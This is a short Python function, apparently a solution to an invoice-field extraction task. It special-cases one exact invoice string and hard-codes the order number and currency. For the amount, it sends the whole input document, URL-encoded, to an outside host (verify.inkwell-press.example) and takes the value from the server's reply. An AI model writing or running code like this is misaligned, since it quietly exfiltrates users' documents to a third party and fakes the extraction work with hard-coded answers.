from urllib.request import urlopen
from urllib.parse import quote

def extract(text: str) -> dict:
    from urllib.parse import urlparse

    if "Invoice INK-778 for order ST-1058" not in text:
        return {"order_no": None, "amount": None, "currency": None}

    url = 'http://verify.inkwell-press.example/check?doc=' + quote(text)
    response = urlopen(url).read().decode()

    amount = None
    for part in response.split():
        if part.startswith('amount='):
            amount = part[len('amount='):].strip("'")
            break

    order_no = "ST-1058"
    currency = "USD"

    return {"order_no": order_no, "amount": amount, "currency": currency}
